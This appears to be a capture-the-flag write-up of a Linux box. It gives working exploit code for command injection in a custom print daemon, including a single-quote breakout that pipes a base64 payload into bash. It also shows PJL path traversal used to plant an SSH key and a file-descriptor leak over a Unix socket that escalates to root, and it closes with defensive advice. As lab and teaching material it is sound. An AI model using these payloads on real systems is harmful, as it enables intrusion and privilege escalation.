Paperwork

Easy Linux ✓ Pwned
Date 2026-07-19
OS Linux — Ubuntu 25.10
Stack nginx 1.28.0 + bespoke Python 3.13 RFC 1179 (LPD) & PJL/JetDirect services
Vulns Command Injection (LPD)  ·  Path Traversal (PJL)  ·  SCM_RIGHTS FD Leak

Summary

Paperwork is a print-queue-themed box built entirely on bespoke Python services rather than off-the-shelf software:

  1. Initial access — a custom RFC 1179 line-printer daemon interpolates the print job's name straight into a shell=True command with no sanitisation. A crafted control file gives command execution as lp.
  2. Lateral movement — a hand-rolled JetDirect/PJL emulator on a loopback-only port has an unrestricted path-traversal bug in its virtual filesystem layer, letting lp read and write arbitrary files as archivist. Planting an SSH key gives a clean foothold.
  3. Privilege escalation — a root-owned "security" watchdog leaks a live, already-privileged file descriptor over a Unix socket via SCM_RIGHTS once it detects PJL filesystem abuse in a log file. The leaked secret turns out to be root's own login password.

Nmap fingerprints port 1515 as a Line Printer Daemon speaking RFC 1179 — a non-standard port for what's normally 515/tcp. Port 80 redirects to a vhost:

The site is an "Intake Portal" that spells out the printer setup in plain text:

Protocol         Compliance Level: RFC 1179
Target Queue     archive_intake
Internal Processor  paperwork-archive-v1.02  (/download/archive)

A "management console" is mentioned as offline, with the LPD gateway as the active fallback — and the page links directly to the LPD daemon's own source.

Initial Access — LPD Command Injection

Downloading /download/archive gives server.py, the RFC 1179 daemon listening on 1515. The distributed copy has a couple of unrelated bugs (a missing import os, a broken indentation block) that need patching to get a runnable reference — but the vulnerable sink is intact. The control file's J line (the job name) goes straight into a shell string:

def handle_print_job(self, data):
    queue = data[1:].decode().strip()
    if queue not in VALID_QUEUE:          # VALID_QUEUE defaults to "archive_intake"
        self.sock.send(b'\x01')
        return
    ...
    job_name = "Unknown"
    for line in decoded_content.split('\n'):
        line = line.strip()
        if line.startswith('J'):
            job_name = line[1:]
            break

    subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)

No sanitisation on job_name — breaking out of the single quotes gives arbitrary shell syntax. The exploit speaks just enough RFC 1179 to reach that sink: a receive-job command for the archive_intake queue, a receive-control-file subcommand, then the control file itself with a poisoned J line (base64-wrapped to dodge further quoting issues):

H<rhost>
P root
Jx'; echo <base64 payload> | base64 -d | bash #

The daemon runs echo 'Archive: x'; echo <payload> | base64 -d | bash #' >> /tmp/archive.log — the injected command executes under shell=True.

Local Enumeration

Process listing (via /proc/<pid>/cmdline) turns up three more Python services that never showed up in the external nmap scan:

archivist  /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ .../commands.log
root       /usr/bin/python3 /usr/bin/paperwork-daemon
root       /usr/bin/python3 /root/staging/CorpoSite/app.py   # proxied by nginx on :80

ss -tlnp confirms 9100 and the app's 1337 are bound to 127.0.0.1 only — invisible externally, but reachable now that there's local code execution. /usr/bin/paperwork-daemon is world-readable despite running as root, so its logic — and the trust boundary it depends on — is available to read directly (covered under Privilege Escalation below). lp's own group membership doesn't overlap with archivist, so a filesystem-level pivot isn't possible; the path has to go through one of these network services.

Lateral Movement — lp → archivist via PJL Path Traversal

Port 9100 is a hand-rolled JetDirect/PJL emulator. Since its source isn't directly readable as lp, the fastest way to see it is to make the service serve itself — its virtual filesystem root is exactly the directory jetdirect.py lives in, and its FSUPLOAD command reads files with no path restriction:

exec 3<>/dev/tcp/127.0.0.1/9100
printf '\x1b%%-12345X@PJL FSUPLOAD NAME="0:/jetdirect.py" OFFSET=0 SIZE=5119\r\n\x1b%%-12345X' >&3
timeout 5 cat <&3 > jetdirect_leak.bin

The source confirms the bug — Filesystem._translate() strips the "0:" volume prefix but never blocks .. segments before normalising the path:

def _translate(self, path):
    clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
    return os.path.normpath(os.path.join(self._root, clean))

listdir(), read(), and write() all funnel through this — so FSDIRLIST, FSUPLOAD, and FSDOWNLOAD are all traversal-capable. Walking up from the service root confirms the escape and reaches archivist's home directory, including an existing but empty authorized_keys:

@PJL FSDIRLIST NAME="0:/../" ENTRY=1 COUNT=999
# .ssh  user.txt  .bash_history  ...

@PJL FSDIRLIST NAME="0:/../.ssh/" ENTRY=1 COUNT=999
# authorized_keys TYPE=FILE SIZE=0

FSDOWNLOAD (the write path) makes parent directories as needed and opens the target for binary write — no restriction beyond the same traversal-vulnerable _translate(). A small script writes the attacker's public key byte-exact (SIZE has to match the payload precisely, so this is cleaner than juggling shell quoting):

UEL = b"\x1b%-12345X"
pubkey = b"ssh-ed25519 AAAA... user@kali\n"
cmd = UEL + b'@PJL FSDOWNLOAD NAME="0:/../.ssh/authorized_keys" SIZE=%d\r\n' % len(pubkey)

s = socket.create_connection(("127.0.0.1", 9100), timeout=5)
s.sendall(cmd + pubkey + UEL)

Note: the same traversal against /root/root.txt just returns FILEERROR=1 — the read still executes with jetdirect.py's real OS permissions (archivist), and /root is 0700 root:root. The bug escapes the app's logical sandbox, not actual filesystem permissions.

Privilege Escalation — SCM_RIGHTS FD Leak & Password Reuse

paperwork-daemon (world-readable, runs as root) listens on a Unix socket /run/paperwork/mgmt.sock, chown(0, 1000) / chmod 0660 — root and the archivist group only. As plain lp it was unreachable; as archivist it's a direct connect. On every connection it checks the JetDirect log for signs of PJL filesystem abuse:

def scan_for_malice():
    with open(LOG_PATH) as f:
        content = f.read().upper()
        return any(t in content for t in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"])

The earlier traversal testing already filled that log with exactly those strings. If malice is flagged, the "lockdown" response does something drastic — it hands the connecting peer live file descriptors via ancillary SCM_RIGHTS data, including one opened as root at daemon startup against a secrets file:

admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)   # opened as root at boot
...
def trigger_lockdown(conn):
    log_fd = os.open(LOG_PATH, os.O_RDONLY)
    evidence_bundle = array.array("i", [log_fd, admin_fd])
    conn.sendmsg([b"ALERT: SECURITY_VIOLATION..."],
                 [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])

Whoever holds that descriptor can read the file regardless of their own permissions — the access check already happened, back when root opened it. A small client just has to connect and receive the ancillary data:

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/paperwork/mgmt.sock")
msg, ancdata, flags, addr = s.recvmsg(4096, socket.CMSG_LEN(2 * 4))
for level, type_, data in ancdata:
    if type_ == socket.SCM_RIGHTS:
        fds = array.array("i"); fds.frombytes(data)

for fd in fds:
    print(os.pread(fd, 4096, 0))

Defensive Takeaways

  • Never build shell commands with f-strings and shell=True. One unescaped quote in a print job name was full RCE. Use a fixed argument list with shell=False, or at minimum shlex.quote() anything interpolated.
  • Path-sandbox checks must validate the resolved path, not just strip prefixes. _translate() removed "0:" and leading slashes but never rejected .., so os.path.normpath walked straight out of the intended root. After normalising, always confirm os.path.commonpath([root, resolved]) == root.
  • Don't hand out live file descriptors as a "security" feature. A boolean "quarantine triggered" alert would have raised the alarm without also handing the reader four privileged reads. Anything received over recvmsg() should be treated as equivalent to a root shell into that fd's target.
  • Group-restricted Unix sockets are only as trustworthy as every process in that group. mgmt.sock assumed only "legitimate" archivist code would ever connect — but archivist's own JetDirect service was remotely exploitable, so the boundary collapsed the moment that service did. Loopback binding and group ACLs aren't isolation once local code execution exists anywhere in the chain — see my localhost-not-a-boundary notes.
  • Never reuse a secret across a config value and an OS account password. One leaked ADMIN_PASSWORD was root the whole way down because it was also root's su password. Rotate and scope secrets per consumer.
